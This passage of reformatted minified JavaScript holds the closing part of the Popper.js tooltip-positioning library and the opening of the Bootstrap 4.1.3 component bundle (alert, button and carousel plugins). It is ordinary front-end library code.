      p.top -= c - h, p.bottom -= c - h, p.left -= u - f, p.right -= u - f, p.marginTop = h, p.marginLeft = f;
    }
    return (o && !i ? t.contains(l) : t === l && "BODY" !== l.nodeName) && (p = function (e, t, n) {
      var i = 2 < arguments.length && void 0 !== n && n,
        o = v(t, "top"),
        r = v(t, "left"),
        a = i ? -1 : 1;
      return e.top += o * a, e.bottom += o * a, e.left += r * a, e.right += r * a, e;
    }(p, t)), p;
  }
  function k(e) {
    if (!e || !e.parentElement || m()) return document.documentElement;
    for (var t = e.parentElement; t && "none" === w(t, "transform");) t = t.parentElement;
    return t || document.documentElement;
  }
  function S(e, t, n, i, o) {
    var r = 4 < arguments.length && void 0 !== o && o,
      a = {
        top: 0,
        left: 0
      },
      s = r ? k(e) : f(e, t);
    if ("viewport" === i) a = function (e, t) {
      var n = 1 < arguments.length && void 0 !== t && t,
        i = e.ownerDocument.documentElement,
        o = C(e, i),
        r = N(i.clientWidth, window.innerWidth || 0),
        a = N(i.clientHeight, window.innerHeight || 0),
        s = n ? 0 : v(i),
        l = n ? 0 : v(i, "left");
      return x({
        top: s - o.top + o.marginTop,
        left: l - o.left + o.marginLeft,
        width: r,
        height: a
      });
    }(s, r);else {
      var l;
      "scrollParent" === i ? "BODY" === (l = g(h(t))).nodeName && (l = e.ownerDocument.documentElement) : l = "window" === i ? e.ownerDocument.documentElement : i;
      var d = C(l, s, r);
      if ("HTML" !== l.nodeName || function e(t) {
        var n = t.nodeName;
        return "BODY" !== n && "HTML" !== n && ("fixed" === w(t, "position") || e(h(t)));
      }(s)) a = d;else {
        var c = b(),
          u = c.height,
          p = c.width;
        a.top += d.top - d.marginTop, a.bottom = u + d.top, a.left += d.left - d.marginLeft, a.right = p + d.left;
      }
    }
    return a.left += n, a.top += n, a.right -= n, a.bottom -= n, a;
  }
  function s(e, t, i, n, o, r) {
    var a = 5 < arguments.length && void 0 !== r ? r : 0;
    if (-1 === e.indexOf("auto")) return e;
    var s = S(i, n, a, o),
      l = {
        top: {
          width: s.width,
          height: t.top - s.top
        },
        right: {
          width: s.right - t.right,
          height: s.height
        },
        bottom: {
          width: s.width,
          height: s.bottom - t.bottom
        },
        left: {
          width: t.left - s.left,
          height: s.height
        }
      },
      d = Object.keys(l).map(function (e) {
        return X({
          key: e
        }, l[e], {
          area: (t = l[e]).width * t.height
        });
        var t;
      }).sort(function (e, t) {
        return t.area - e.area;
      }),
      c = d.filter(function (e) {
        var t = e.width,
          n = e.height;
        return t >= i.clientWidth && n >= i.clientHeight;
      }),
      u = 0 < c.length ? c[0].key : d[0].key,
      p = e.split("-")[1];
    return u + (p ? "-" + p : "");
  }
  function l(e, t, n, i) {
    var o = 3 < arguments.length && void 0 !== i ? i : null;
    return C(n, o ? k(t) : f(t, n), o);
  }
  function $(e) {
    var t = getComputedStyle(e),
      n = parseFloat(t.marginTop) + parseFloat(t.marginBottom),
      i = parseFloat(t.marginLeft) + parseFloat(t.marginRight);
    return {
      width: e.offsetWidth + i,
      height: e.offsetHeight + n
    };
  }
  function T(e) {
    var t = {
      left: "right",
      right: "left",
      bottom: "top",
      top: "bottom"
    };
    return e.replace(/left|right|bottom|top/g, function (e) {
      return t[e];
    });
  }
  function E(e, t, n) {
    n = n.split("-")[0];
    var i = $(e),
      o = {
        width: i.width,
        height: i.height
      },
      r = -1 !== ["right", "left"].indexOf(n),
      a = r ? "top" : "left",
      s = r ? "left" : "top",
      l = r ? "height" : "width",
      d = r ? "width" : "height";
    return o[a] = t[a] + t[l] / 2 - i[l] / 2, o[s] = n === s ? t[s] - i[d] : t[T(s)], o;
  }
  function D(e, t) {
    return Array.prototype.find ? e.find(t) : e.filter(t)[0];
  }
  function _(e, n, t) {
    return (void 0 === t ? e : e.slice(0, function (e, t, n) {
      if (Array.prototype.findIndex) return e.findIndex(function (e) {
        return e[t] === n;
      });
      var i = D(e, function (e) {
        return e[t] === n;
      });
      return e.indexOf(i);
    }(e, "name", t))).forEach(function (e) {
      e.function && console.warn("`modifier.function` is deprecated, use `modifier.fn`!");
      var t = e.function || e.fn;
      e.enabled && r(t) && (n.offsets.popper = x(n.offsets.popper), n.offsets.reference = x(n.offsets.reference), n = t(n, e));
    }), n;
  }
  function e(e, n) {
    return e.some(function (e) {
      var t = e.name;
      return e.enabled && t === n;
    });
  }
  function A(e) {
    for (var t = [!1, "ms", "Webkit", "Moz", "O"], n = e.charAt(0).toUpperCase() + e.slice(1), i = 0; i < t.length; i++) {
      var o = t[i],
        r = o ? "" + o + n : e;
      if (void 0 !== document.body.style[r]) return r;
    }
    return null;
  }
  function a(e) {
    var t = e.ownerDocument;
    return t ? t.defaultView : window;
  }
  function t(e, t, n, i) {
    n.updateBound = i, a(e).addEventListener("resize", n.updateBound, {
      passive: !0
    });
    var o = g(e);
    return function e(t, n, i, o) {
      var r = "BODY" === t.nodeName,
        a = r ? t.ownerDocument.defaultView : t;
      a.addEventListener(n, i, {
        passive: !0
      }), r || e(g(a.parentNode), n, i, o), o.push(a);
    }(o, "scroll", n.updateBound, n.scrollParents), n.scrollElement = o, n.eventsEnabled = !0, n;
  }
  function n() {
    var e, t;
    this.state.eventsEnabled && (cancelAnimationFrame(this.scheduleUpdate), this.state = (e = this.reference, t = this.state, a(e).removeEventListener("resize", t.updateBound), t.scrollParents.forEach(function (e) {
      e.removeEventListener("scroll", t.updateBound);
    }), t.updateBound = null, t.scrollParents = [], t.scrollElement = null, t.eventsEnabled = !1, t));
  }
  function p(e) {
    return "" !== e && !isNaN(parseFloat(e)) && isFinite(e);
  }
  function d(n, i) {
    Object.keys(i).forEach(function (e) {
      var t = "";
      -1 !== ["width", "height", "top", "right", "bottom", "left"].indexOf(e) && p(i[e]) && (t = "px"), n.style[e] = i[e] + t;
    });
  }
  function I(e, t, n) {
    var i = D(e, function (e) {
        return e.name === t;
      }),
      o = !!i && e.some(function (e) {
        return e.name === n && e.enabled && e.order < i.order;
      });
    if (!o) {
      var r = "`" + t + "`";
      console.warn("`" + n + "` modifier is required by " + r + " modifier in order to work, be sure to include it before " + r + "!");
    }
    return o;
  }
  function o(e, t) {
    var n = 1 < arguments.length && void 0 !== t && t,
      i = K.indexOf(e),
      o = K.slice(i + 1).concat(K.slice(0, i));
    return n ? o.reverse() : o;
  }
  function P(e, o, r, t) {
    var a = [0, 0],
      s = -1 !== ["right", "left"].indexOf(t),
      n = e.split(/(\+|\-)/).map(function (e) {
        return e.trim();
      }),
      i = n.indexOf(D(n, function (e) {
        return -1 !== e.search(/,|\s/);
      }));
    n[i] && -1 === n[i].indexOf(",") && console.warn("Offsets separated by white space(s) are deprecated, use a comma (,) instead.");
    var l = /\s*,\s*|\s+/,
      d = -1 === i ? [n] : [n.slice(0, i).concat([n[i].split(l)[0]]), [n[i].split(l)[1]].concat(n.slice(i + 1))];
    return (d = d.map(function (e, t) {
      var n = (1 === t ? !s : s) ? "height" : "width",
        i = !1;
      return e.reduce(function (e, t) {
        return "" === e[e.length - 1] && -1 !== ["+", "-"].indexOf(t) ? (e[e.length - 1] = t, i = !0, e) : i ? (e[e.length - 1] += t, i = !1, e) : e.concat(t);
      }, []).map(function (e) {
        return function (e, t, n, i) {
          var o,
            r = e.match(/((?:\-|\+)?\d*\.?\d*)(.*)/),
            a = +r[1],
            s = r[2];
          if (!a) return e;
          if (0 !== s.indexOf("%")) return "vh" !== s && "vw" !== s ? a : ("vh" === s ? N(document.documentElement.clientHeight, window.innerHeight || 0) : N(document.documentElement.clientWidth, window.innerWidth || 0)) / 100 * a;
          switch (s) {
            case "%p":
              o = n;
              break;
            case "%":
            case "%r":
            default:
              o = i;
          }
          return x(o)[t] / 100 * a;
        }(e, n, o, r);
      });
    })).forEach(function (n, i) {
      n.forEach(function (e, t) {
        p(e) && (a[i] += e * ("-" === n[t - 1] ? -1 : 1));
      });
    }), a;
  }
  for (var H = Math.min, M = Math.round, L = Math.floor, N = Math.max, O = "undefined" != typeof window && "undefined" != typeof document, R = ["Edge", "Trident", "Firefox"], F = 0, B = 0; B < R.length; B += 1) if (O && 0 <= navigator.userAgent.indexOf(R[B])) {
    F = 1;
    break;
  }
  function z(e, t, n) {
    return t in e ? Object.defineProperty(e, t, {
      value: n,
      enumerable: !0,
      configurable: !0,
      writable: !0
    }) : e[t] = n, e;
  }
  var q = O && window.Promise ? function (e) {
      var t = !1;
      return function () {
        t || (t = !0, window.Promise.resolve().then(function () {
          t = !1, e();
        }));
      };
    } : function (e) {
      var t = !1;
      return function () {
        t || (t = !0, setTimeout(function () {
          t = !1, e();
        }, F));
      };
    },
    W = O && !(!window.MSInputMethodContext || !document.documentMode),
    U = O && /MSIE 10/.test(navigator.userAgent),
    Y = function (e, t, n) {
      return t && te(e.prototype, t), n && te(e, n), e;
    },
    X = Object.assign || function (e) {
      for (var t, n = 1; n < arguments.length; n++) for (var i in t = arguments[n]) Object.prototype.hasOwnProperty.call(t, i) && (e[i] = t[i]);
      return e;
    },
    V = ["auto-start", "auto", "auto-end", "top-start", "top", "top-end", "right-start", "right", "right-end", "bottom-end", "bottom", "bottom-start", "left-end", "left", "left-start"],
    K = V.slice(3),
    Q = "flip",
    G = "clockwise",
    J = "counterclockwise",
    Z = (Y(ee, [{
      key: "update",
      value: function () {
        return function () {
          if (!this.state.isDestroyed) {
            var e = {
              instance: this,
              styles: {},
              arrowStyles: {},
              attributes: {},
              flipped: !1,
              offsets: {}
            };
            e.offsets.reference = l(this.state, this.popper, this.reference, this.options.positionFixed), e.placement = s(this.options.placement, e.offsets.reference, this.popper, this.reference, this.options.modifiers.flip.boundariesElement, this.options.modifiers.flip.padding), e.originalPlacement = e.placement, e.positionFixed = this.options.positionFixed, e.offsets.popper = E(this.popper, e.offsets.reference, e.placement), e.offsets.popper.position = this.options.positionFixed ? "fixed" : "absolute", e = _(this.modifiers, e), this.state.isCreated ? this.options.onUpdate(e) : (this.state.isCreated = !0, this.options.onCreate(e));
          }
        }.call(this);
      }
    }, {
      key: "destroy",
      value: function () {
        return function () {
          return this.state.isDestroyed = !0, e(this.modifiers, "applyStyle") && (this.popper.removeAttribute("x-placement"), this.popper.style.position = "", this.popper.style.top = "", this.popper.style.left = "", this.popper.style.right = "", this.popper.style.bottom = "", this.popper.style.willChange = "", this.popper.style[A("transform")] = ""), this.disableEventListeners(), this.options.removeOnDestroy && this.popper.parentNode.removeChild(this.popper), this;
        }.call(this);
      }
    }, {
      key: "enableEventListeners",
      value: function () {
        return function () {
          this.state.eventsEnabled || (this.state = t(this.reference, this.options, this.state, this.scheduleUpdate));
        }.call(this);
      }
    }, {
      key: "disableEventListeners",
      value: function () {
        return n.call(this);
      }
    }]), ee);
  function ee(e, t) {
    var n = this,
      i = 2 < arguments.length && void 0 !== arguments[2] ? arguments[2] : {};
    (function (e, t) {
      if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
    })(this, ee), this.scheduleUpdate = function () {
      return requestAnimationFrame(n.update);
    }, this.update = q(this.update.bind(this)), this.options = X({}, ee.Defaults, i), this.state = {
      isDestroyed: !1,
      isCreated: !1,
      scrollParents: []
    }, this.reference = e && e.jquery ? e[0] : e, this.popper = t && t.jquery ? t[0] : t, this.options.modifiers = {}, Object.keys(X({}, ee.Defaults.modifiers, i.modifiers)).forEach(function (e) {
      n.options.modifiers[e] = X({}, ee.Defaults.modifiers[e] || {}, i.modifiers ? i.modifiers[e] : {});
    }), this.modifiers = Object.keys(this.options.modifiers).map(function (e) {
      return X({
        name: e
      }, n.options.modifiers[e]);
    }).sort(function (e, t) {
      return e.order - t.order;
    }), this.modifiers.forEach(function (e) {
      e.enabled && r(e.onLoad) && e.onLoad(n.reference, n.popper, n.options, e, n.state);
    }), this.update();
    var o = this.options.eventsEnabled;
    o && this.enableEventListeners(), this.state.eventsEnabled = o;
  }
  function te(e, t) {
    for (var n, i = 0; i < t.length; i++) (n = t[i]).enumerable = n.enumerable || !1, n.configurable = !0, "value" in n && (n.writable = !0), Object.defineProperty(e, n.key, n);
  }
  return Z.Utils = ("undefined" == typeof window ? global : window).PopperUtils, Z.placements = V, Z.Defaults = {
    placement: "bottom",
    positionFixed: !1,
    eventsEnabled: !0,
    removeOnDestroy: !1,
    onCreate: function () {},
    onUpdate: function () {},
    modifiers: {
      shift: {
        order: 100,
        enabled: !0,
        fn: function (e) {
          var t = e.placement,
            n = t.split("-")[0],
            i = t.split("-")[1];
          if (i) {
            var o = e.offsets,
              r = o.reference,
              a = o.popper,
              s = -1 !== ["bottom", "top"].indexOf(n),
              l = s ? "left" : "top",
              d = s ? "width" : "height",
              c = {
                start: z({}, l, r[l]),
                end: z({}, l, r[l] + r[d] - a[d])
              };
            e.offsets.popper = X({}, a, c[i]);
          }
          return e;
        }
      },
      offset: {
        order: 200,
        enabled: !0,
        fn: function (e, t) {
          var n,
            i = t.offset,
            o = e.placement,
            r = e.offsets,
            a = r.popper,
            s = r.reference,
            l = o.split("-")[0];
          return n = p(+i) ? [+i, 0] : P(i, a, s, l), "left" === l ? (a.top += n[0], a.left -= n[1]) : "right" === l ? (a.top += n[0], a.left += n[1]) : "top" === l ? (a.left += n[0], a.top -= n[1]) : "bottom" === l && (a.left += n[0], a.top += n[1]), e.popper = a, e;
        },
        offset: 0
      },
      preventOverflow: {
        order: 300,
        enabled: !0,
        fn: function (e, i) {
          var t = i.boundariesElement || y(e.instance.popper);
          e.instance.reference === t && (t = y(t));
          var n = A("transform"),
            o = e.instance.popper.style,
            r = o.top,
            a = o.left,
            s = o[n];
          o.top = "", o.left = "", o[n] = "";
          var l = S(e.instance.popper, e.instance.reference, i.padding, t, e.positionFixed);
          o.top = r, o.left = a, o[n] = s, i.boundaries = l;
          var d = i.priority,
            c = e.offsets.popper,
            u = {
              primary: function (e) {
                var t = c[e];
                return c[e] < l[e] && !i.escapeWithReference && (t = N(c[e], l[e])), z({}, e, t);
              },
              secondary: function (e) {
                var t = "right" === e ? "left" : "top",
                  n = c[t];
                return c[e] > l[e] && !i.escapeWithReference && (n = H(c[t], l[e] - ("right" === e ? c.width : c.height))), z({}, t, n);
              }
            };
          return d.forEach(function (e) {
            var t = -1 === ["left", "top"].indexOf(e) ? "secondary" : "primary";
            c = X({}, c, u[t](e));
          }), e.offsets.popper = c, e;
        },
        priority: ["left", "right", "top", "bottom"],
        padding: 5,
        boundariesElement: "scrollParent"
      },
      keepTogether: {
        order: 400,
        enabled: !0,
        fn: function (e) {
          var t = e.offsets,
            n = t.popper,
            i = t.reference,
            o = e.placement.split("-")[0],
            r = L,
            a = -1 !== ["top", "bottom"].indexOf(o),
            s = a ? "right" : "bottom",
            l = a ? "left" : "top",
            d = a ? "width" : "height";
          return n[s] < r(i[l]) && (e.offsets.popper[l] = r(i[l]) - n[d]), n[l] > r(i[s]) && (e.offsets.popper[l] = r(i[s])), e;
        }
      },
      arrow: {
        order: 500,
        enabled: !0,
        fn: function (e, t) {
          var n;
          if (!I(e.instance.modifiers, "arrow", "keepTogether")) return e;
          var i = t.element;
          if ("string" == typeof i) {
            if (!(i = e.instance.popper.querySelector(i))) return e;
          } else if (!e.instance.popper.contains(i)) return console.warn("WARNING: `arrow.element` must be child of its popper element!"), e;
          var o = e.placement.split("-")[0],
            r = e.offsets,
            a = r.popper,
            s = r.reference,
            l = -1 !== ["left", "right"].indexOf(o),
            d = l ? "height" : "width",
            c = l ? "Top" : "Left",
            u = c.toLowerCase(),
            p = l ? "left" : "top",
            h = l ? "bottom" : "right",
            f = $(i)[d];
          s[h] - f < a[u] && (e.offsets.popper[u] -= a[u] - (s[h] - f)), s[u] + f > a[h] && (e.offsets.popper[u] += s[u] + f - a[h]), e.offsets.popper = x(e.offsets.popper);
          var g = s[u] + s[d] / 2 - f / 2,
            m = w(e.instance.popper),
            v = parseFloat(m["margin" + c], 10),
            y = parseFloat(m["border" + c + "Width"], 10),
            b = g - e.offsets.popper[u] - v - y;
          return b = N(H(a[d] - f, b), 0), e.arrowElement = i, e.offsets.arrow = (z(n = {}, u, M(b)), z(n, p, ""), n), e;
        },
        element: "[x-arrow]"
      },
      flip: {
        order: 600,
        enabled: !0,
        fn: function (f, g) {
          if (e(f.instance.modifiers, "inner")) return f;
          if (f.flipped && f.placement === f.originalPlacement) return f;
          var m = S(f.instance.popper, f.instance.reference, g.padding, g.boundariesElement, f.positionFixed),
            v = f.placement.split("-")[0],
            y = T(v),
            b = f.placement.split("-")[1] || "",
            w = [];
          switch (g.behavior) {
            case Q:
              w = [v, y];
              break;
            case G:
              w = o(v);
              break;
            case J:
              w = o(v, !0);
              break;
            default:
              w = g.behavior;
          }
          return w.forEach(function (e, t) {
            if (v !== e || w.length === t + 1) return f;
            v = f.placement.split("-")[0], y = T(v);
            var n,
              i = f.offsets.popper,
              o = f.offsets.reference,
              r = L,
              a = "left" === v && r(i.right) > r(o.left) || "right" === v && r(i.left) < r(o.right) || "top" === v && r(i.bottom) > r(o.top) || "bottom" === v && r(i.top) < r(o.bottom),
              s = r(i.left) < r(m.left),
              l = r(i.right) > r(m.right),
              d = r(i.top) < r(m.top),
              c = r(i.bottom) > r(m.bottom),
              u = "left" === v && s || "right" === v && l || "top" === v && d || "bottom" === v && c,
              p = -1 !== ["top", "bottom"].indexOf(v),
              h = !!g.flipVariations && (p && "start" === b && s || p && "end" === b && l || !p && "start" === b && d || !p && "end" === b && c);
            (a || u || h) && (f.flipped = !0, (a || u) && (v = w[t + 1]), h && (b = "end" === (n = b) ? "start" : "start" === n ? "end" : n), f.placement = v + (b ? "-" + b : ""), f.offsets.popper = X({}, f.offsets.popper, E(f.instance.popper, f.offsets.reference, f.placement)), f = _(f.instance.modifiers, f, "flip"));
          }), f;
        },
        behavior: "flip",
        padding: 5,
        boundariesElement: "viewport"
      },
      inner: {
        order: 700,
        enabled: !1,
        fn: function (e) {
          var t = e.placement,
            n = t.split("-")[0],
            i = e.offsets,
            o = i.popper,
            r = i.reference,
            a = -1 !== ["left", "right"].indexOf(n),
            s = -1 === ["top", "left"].indexOf(n);
          return o[a ? "left" : "top"] = r[n] - (s ? o[a ? "width" : "height"] : 0), e.placement = T(t), e.offsets.popper = x(o), e;
        }
      },
      hide: {
        order: 800,
        enabled: !0,
        fn: function (e) {
          if (!I(e.instance.modifiers, "hide", "preventOverflow")) return e;
          var t = e.offsets.reference,
            n = D(e.instance.modifiers, function (e) {
              return "preventOverflow" === e.name;
            }).boundaries;
          if (t.bottom < n.top || t.left > n.right || t.top > n.bottom || t.right < n.left) {
            if (!0 === e.hide) return e;
            e.hide = !0, e.attributes["x-out-of-boundaries"] = "";
          } else {
            if (!1 === e.hide) return e;
            e.hide = !1, e.attributes["x-out-of-boundaries"] = !1;
          }
          return e;
        }
      },
      computeStyle: {
        order: 850,
        enabled: !0,
        fn: function (e, t) {
          var n = t.x,
            i = t.y,
            o = e.offsets.popper,
            r = D(e.instance.modifiers, function (e) {
              return "applyStyle" === e.name;
            }).gpuAcceleration;
          void 0 !== r && console.warn("WARNING: `gpuAcceleration` option moved to `computeStyle` modifier and will not be supported in future versions of Popper.js!");
          var a,
            s,
            l = void 0 === r ? t.gpuAcceleration : r,
            d = j(y(e.instance.popper)),
            c = {
              position: o.position
            },
            u = {
              left: L(o.left),
              top: M(o.top),
              bottom: M(o.bottom),
              right: L(o.right)
            },
            p = "bottom" === n ? "top" : "bottom",
            h = "right" === i ? "left" : "right",
            f = A("transform");
          if (s = "bottom" == p ? -d.height + u.bottom : u.top, a = "right" == h ? -d.width + u.right : u.left, l && f) c[f] = "translate3d(" + a + "px, " + s + "px, 0)", c[p] = 0, c[h] = 0, c.willChange = "transform";else {
            var g = "bottom" == p ? -1 : 1,
              m = "right" == h ? -1 : 1;
            c[p] = s * g, c[h] = a * m, c.willChange = p + ", " + h;
          }
          var v = {
            "x-placement": e.placement
          };
          return e.attributes = X({}, v, e.attributes), e.styles = X({}, c, e.styles), e.arrowStyles = X({}, e.offsets.arrow, e.arrowStyles), e;
        },
        gpuAcceleration: !0,
        x: "bottom",
        y: "right"
      },
      applyStyle: {
        order: 900,
        enabled: !0,
        fn: function (e) {
          return d(e.instance.popper, e.styles), t = e.instance.popper, n = e.attributes, Object.keys(n).forEach(function (e) {
            !1 === n[e] ? t.removeAttribute(e) : t.setAttribute(e, n[e]);
          }), e.arrowElement && Object.keys(e.arrowStyles).length && d(e.arrowElement, e.arrowStyles), e;
          var t, n;
        },
        onLoad: function (e, t, n, i, o) {
          var r = l(o, t, e, n.positionFixed),
            a = s(n.placement, r, t, e, n.modifiers.flip.boundariesElement, n.modifiers.flip.padding);
          return t.setAttribute("x-placement", a), d(t, {
            position: n.positionFixed ? "fixed" : "absolute"
          }), n;
        },
        gpuAcceleration: void 0
      }
    }
  }, Z;
}), function (e, t) {
  "object" == typeof exports && "undefined" != typeof module ? t(exports, require("jquery"), require("popper.js")) : "function" == typeof define && define.amd ? define(["exports", "jquery", "popper.js"], t) : t(e.bootstrap = {}, e.jQuery, e.Popper);
}(this, function (e, t, c) {
  "use strict";

  function i(e, t) {
    for (var n = 0; n < t.length; n++) {
      var i = t[n];
      i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i);
    }
  }
  function r(e, t, n) {
    return t && i(e.prototype, t), n && i(e, n), e;
  }
  function a(o) {
    for (var e = 1; e < arguments.length; e++) {
      var r = null != arguments[e] ? arguments[e] : {},
        t = Object.keys(r);
      "function" == typeof Object.getOwnPropertySymbols && (t = t.concat(Object.getOwnPropertySymbols(r).filter(function (e) {
        return Object.getOwnPropertyDescriptor(r, e).enumerable;
      }))), t.forEach(function (e) {
        var t, n, i;
        t = o, i = r[n = e], n in t ? Object.defineProperty(t, n, {
          value: i,
          enumerable: !0,
          configurable: !0,
          writable: !0
        }) : t[n] = i;
      });
    }
    return o;
  }
  t = t && t.hasOwnProperty("default") ? t.default : t, c = c && c.hasOwnProperty("default") ? c.default : c;
  var o,
    n,
    s,
    l,
    d,
    u,
    p,
    h,
    f,
    g,
    m,
    v,
    y,
    b,
    w,
    x,
    j,
    C,
    k,
    S,
    $,
    T,
    E,
    D,
    _,
    A,
    I,
    P,
    H,
    M,
    L,
    N,
    O,
    R,
    F,
    B,
    z,
    q,
    W,
    U,
    Y,
    X,
    V,
    K,
    Q,
    G,
    J,
    Z,
    ee,
    te,
    ne,
    ie,
    oe,
    re,
    ae,
    se,
    le,
    de,
    ce,
    ue,
    pe,
    he,
    fe,
    ge,
    me,
    ve,
    ye,
    be,
    we,
    xe,
    je,
    Ce,
    ke,
    Se,
    $e,
    Te,
    Ee,
    De,
    _e,
    Ae,
    Ie,
    Pe,
    He,
    Me,
    Le,
    Ne,
    Oe,
    Re,
    Fe,
    Be,
    ze,
    qe,
    We,
    Ue,
    Ye,
    Xe,
    Ve,
    Ke,
    Qe,
    Ge,
    Je,
    Ze,
    et,
    tt,
    nt,
    it,
    ot,
    rt,
    at,
    st,
    lt,
    dt,
    ct,
    ut,
    pt,
    ht,
    ft,
    gt,
    mt,
    vt,
    yt,
    bt,
    wt,
    xt,
    jt,
    Ct,
    kt,
    St,
    $t,
    Tt,
    Et,
    Dt,
    _t,
    At,
    It,
    Pt,
    Ht,
    Mt,
    Lt = (Ht = "transitionend", Mt = {
      TRANSITION_END: "bsTransitionEnd",
      getUID: function (e) {
        for (; e += ~~(1e6 * Math.random()), document.getElementById(e););
        return e;
      },
      getSelectorFromElement: function (e) {
        var t = e.getAttribute("data-target");
        t && "#" !== t || (t = e.getAttribute("href") || "");
        try {
          return document.querySelector(t) ? t : null;
        } catch (e) {
          return null;
        }
      },
      getTransitionDurationFromElement: function (e) {
        if (!e) return 0;
        var t = Pt(e).css("transition-duration");
        return parseFloat(t) ? (t = t.split(",")[0], 1e3 * parseFloat(t)) : 0;
      },
      reflow: function (e) {
        return e.offsetHeight;
      },
      triggerTransitionEnd: function (e) {
        Pt(e).trigger(Ht);
      },
      supportsTransitionEnd: function () {
        return Boolean(Ht);
      },
      isElement: function (e) {
        return (e[0] || e).nodeType;
      },
      typeCheckConfig: function (e, t, n) {
        for (var i in n) if (Object.prototype.hasOwnProperty.call(n, i)) {
          var o = n[i],
            r = t[i],
            a = r && Mt.isElement(r) ? "element" : {}.toString.call(r).match(/\s([a-z]+)/i)[1].toLowerCase();
          if (!new RegExp(o).test(a)) throw new Error(e.toUpperCase() + ': Option "' + i + '" provided type "' + a + '" but expected type "' + o + '".');
        }
      }
    }, (Pt = t).fn.emulateTransitionEnd = function (e) {
      var t = this,
        n = !1;
      return Pt(this).one(Mt.TRANSITION_END, function () {
        n = !0;
      }), setTimeout(function () {
        n || Mt.triggerTransitionEnd(t);
      }, e), this;
    }, Pt.event.special[Mt.TRANSITION_END] = {
      bindType: Ht,
      delegateType: Ht,
      handle: function (e) {
        if (Pt(e.target).is(this)) return e.handleObj.handler.apply(this, arguments);
      }
    }, Mt),
    Nt = (n = "alert", l = "." + (s = "bs.alert"), d = (o = t).fn[n], u = {
      CLOSE: "close" + l,
      CLOSED: "closed" + l,
      CLICK_DATA_API: "click" + l + ".data-api"
    }, (It = tn.prototype).close = function (e) {
      var t = this._element;
      e && (t = this._getRootElement(e)), this._triggerCloseEvent(t).isDefaultPrevented() || this._removeElement(t);
    }, It.dispose = function () {
      o.removeData(this._element, s), this._element = null;
    }, It._getRootElement = function (e) {
      var t = Lt.getSelectorFromElement(e),
        n = !1;
      return t && (n = document.querySelector(t)), n = n || o(e).closest(".alert")[0];
    }, It._triggerCloseEvent = function (e) {
      var t = o.Event(u.CLOSE);
      return o(e).trigger(t), t;
    }, It._removeElement = function (t) {
      var n = this;
      if (o(t).removeClass("show"), o(t).hasClass("fade")) {
        var e = Lt.getTransitionDurationFromElement(t);
        o(t).one(Lt.TRANSITION_END, function (e) {
          return n._destroyElement(t, e);
        }).emulateTransitionEnd(e);
      } else this._destroyElement(t);
    }, It._destroyElement = function (e) {
      o(e).detach().trigger(u.CLOSED).remove();
    }, tn._jQueryInterface = function (n) {
      return this.each(function () {
        var e = o(this),
          t = e.data(s);
        t || (t = new tn(this), e.data(s, t)), "close" === n && t[n](this);
      });
    }, tn._handleDismiss = function (t) {
      return function (e) {
        e && e.preventDefault(), t.close(this);
      };
    }, r(tn, null, [{
      key: "VERSION",
      get: function () {
        return "4.1.3";
      }
    }]), p = tn, o(document).on(u.CLICK_DATA_API, '[data-dismiss="alert"]', p._handleDismiss(new p())), o.fn[n] = p._jQueryInterface, o.fn[n].Constructor = p, o.fn[n].noConflict = function () {
      return o.fn[n] = d, p._jQueryInterface;
    }, p),
    Ot = (f = "button", m = "." + (g = "bs.button"), v = ".data-api", y = (h = t).fn[f], b = "active", w = '[data-toggle^="button"]', x = {
      CLICK_DATA_API: "click" + m + v,
      FOCUS_BLUR_DATA_API: "focus" + m + v + " blur" + m + v
    }, (At = en.prototype).toggle = function () {
      var e = !0,
        t = !0,
        n = h(this._element).closest('[data-toggle="buttons"]')[0];
      if (n) {
        var i = this._element.querySelector("input");
        if (i) {
          if ("radio" === i.type) if (i.checked && this._element.classList.contains(b)) e = !1;else {
            var o = n.querySelector(".active");
            o && h(o).removeClass(b);
          }
          if (e) {
            if (i.hasAttribute("disabled") || n.hasAttribute("disabled") || i.classList.contains("disabled") || n.classList.contains("disabled")) return;
            i.checked = !this._element.classList.contains(b), h(i).trigger("change");
          }
          i.focus(), t = !1;
        }
      }
      t && this._element.setAttribute("aria-pressed", !this._element.classList.contains(b)), e && h(this._element).toggleClass(b);
    }, At.dispose = function () {
      h.removeData(this._element, g), this._element = null;
    }, en._jQueryInterface = function (t) {
      return this.each(function () {
        var e = h(this).data(g);
        e || (e = new en(this), h(this).data(g, e)), "toggle" === t && e[t]();
      });
    }, r(en, null, [{
      key: "VERSION",
      get: function () {
        return "4.1.3";
      }
    }]), j = en, h(document).on(x.CLICK_DATA_API, w, function (e) {
      e.preventDefault();
      var t = e.target;
      h(t).hasClass("btn") || (t = h(t).closest(".btn")), j._jQueryInterface.call(h(t), "toggle");
    }).on(x.FOCUS_BLUR_DATA_API, w, function (e) {
      var t = h(e.target).closest(".btn")[0];
      h(t).toggleClass("focus", /^focus(in)?$/.test(e.type));
    }), h.fn[f] = j._jQueryInterface, h.fn[f].Constructor = j, h.fn[f].noConflict = function () {
      return h.fn[f] = y, j._jQueryInterface;
    }, j),
    Rt = (k = "carousel", $ = "." + (S = "bs.carousel"), T = ".data-api", E = (C = t).fn[k], D = {
      interval: 5e3,
      keyboard: !0,
      slide: !1,
      pause: "hover",
      wrap: !0
    }, _ = {
      interval: "(number|boolean)",
      keyboard: "boolean",
      slide: "(boolean|string)",
      pause: "(string|boolean)",
      wrap: "boolean"
    }, A = "next", I = "prev", P = {
      SLIDE: "slide" + $,
      SLID: "slid" + $,
      KEYDOWN: "keydown" + $,
      MOUSEENTER: "mouseenter" + $,
      MOUSELEAVE: "mouseleave" + $,
      TOUCHEND: "touchend" + $,
      LOAD_DATA_API: "load" + $ + T,
      CLICK_DATA_API: "click" + $ + T
    }, H = "active", M = ".active.carousel-item", (_t = Zt.prototype).next = function () {
      this._isSliding || this._slide(A);
    }, _t.nextWhenVisible = function () {
      !document.hidden && C(this._element).is(":visible") && "hidden" !== C(this._element).css("visibility") && this.next();
    }, _t.prev = function () {
      this._isSliding || this._slide(I);
    }, _t.pause = function (e) {
      e || (this._isPaused = !0), this._element.querySelector(".carousel-item-next, .carousel-item-prev") && (Lt.triggerTransitionEnd(this._element), this.cycle(!0)), clearInterval(this._interval), this._interval = null;
    }, _t.cycle = function (e) {
      e || (this._isPaused = !1), this._interval && (clearInterval(this._interval), this._interval = null), this._config.interval && !this._isPaused && (this._interval = setInterval((document.visibilityState ? this.nextWhenVisible : this.next).bind(this), this._config.interval));
    }, _t.to = function (e) {
